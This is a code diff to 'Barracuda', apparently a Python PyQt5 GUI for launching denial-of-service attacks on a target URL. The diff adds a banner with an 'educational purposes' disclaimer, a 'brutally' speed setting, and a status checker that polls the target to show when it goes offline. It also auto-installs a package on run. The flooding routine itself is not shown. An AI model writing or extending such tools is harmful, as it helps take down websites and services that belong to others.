@@ -2,20 +2,62 @@ import os
 os.system("pip install PyQt5")
 try:
     import sys
-    from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QLabel, QLineEdit, QComboBox, QPushButton, QVBoxLayout, QGridLayout
+    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QLineEdit, QComboBox, QPushButton, QVBoxLayout, QGridLayout, QWidget
     from PyQt5.QtGui import QIcon, QPixmap
-    from PyQt5.QtCore import Qt
+    from PyQt5.QtCore import Qt, QTimer
+    from colorama import Fore, init
     import socket
     import threading
     import string
     import random
+    import platform
     import time
     import os
     import requests
+    import queue
 except ModuleNotFoundError as e:
     print(f"{e} start setup.py")
     time.sleep(5)
     exit()
+
+init()
+
+def cls():
+    if platform.system() == "Windows":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+cls()
+
+ascii_art = """
+                                                                                          
+                            _                                                 _        
+                            ( )                                               ( )       
+                            | |_      _ _  _ __  _ __   _ _    ___  _   _    _| |   _ _ 
+                            | '_`\  /'_` )( '__)( '__)/'_` ) /'___)( ) ( ) /'_` | /'_` )
+                            | |_) )( (_| || |   | |  ( (_| |( (___ | (_) |( (_| |( (_| |
+                            (_,__/'`\__,_)(_)   (_)  `\__,_)`\____)`\___/'`\__,_)`\__,_)
+                                                                                        
+                                                           
+                                                                            
+~ Tool created by barra-dev.
+~ This tool was created for educational purposes. I am not responsible for your use of this tool.  
+
+-----------------------------------------------------------------------------------------------------
+
+"""
+
+color_range = [Fore.BLUE, Fore.LIGHTBLUE_EX, Fore.WHITE, Fore.LIGHTBLACK_EX]
+gradient_art = ""
+
+for line in ascii_art.splitlines():
+    for i, char in enumerate(line):
+        color = color_range[i % len(color_range)]
+        gradient_art += f"{color}{char}"
+    gradient_art += "\n"
+
+print(gradient_art)
 
 class DDosGUI(QMainWindow):
     def __init__(self):
@@ -30,7 +72,7 @@ class DDosGUI(QMainWindow):
         self.setWindowTitle('Barracuda ~ By barra-dev')
 
         # Configure l'icône de la fenêtre
-        self.setWindowIcon(QIcon(os.path.join(os.path.dirname(os.path.abspath(__file__)), "img", "logo.png")))
+        self.setWindowIcon(QIcon(os.path.join(os.path.dirname(os.path.abspath(__file__)), "img", "logo.ico")))
 
         # Configure l'interface
         central_widget = QWidget()
@@ -79,6 +121,10 @@ class DDosGUI(QMainWindow):
         layout.addWidget(self.background_label, 0, 0, 6, 2)
 
         self.resize(728, 410)
+
+        # Mise à jour du statut
+        self.status_queue = queue.Queue()
+        self.update_status()
 
     def start_attack(self):
         target_url = self.target_entry.text()
@@ -164,6 +210,33 @@ class DDosGUI(QMainWindow):
             'brutally': 0.01
         }
         return speed_map.get(speed, 0)
+
+    def update_status(self):
+        threading.Thread(target=self.check_status).start()
+        QTimer.singleShot(3000, self.update_status)
+
+    def check_status(self):
+        target_url = self.target_entry.text()
+        if target_url:
+            try:
+                response = requests.get(target_url, timeout=5)
+                if response.status_code == 200:
+                    status_text = "Status: Online"
+                else:
+                    status_text = f"Status: Error {response.status_code}"
+            except requests.RequestException:
+                status_text = "Status: Offline"
+        else:
+            status_text = "Status: Unknown"
+        
+        self.status_queue.put(status_text)
+        QTimer.singleShot(100, self.update_status_label)
+
+    def update_status_label(self):
+        if not self.status_queue.empty():
+            status_text = self.status_queue.get()
+            self.status_label.setText(status_text)
+
 
 def main():
     app = QApplication(sys.argv)
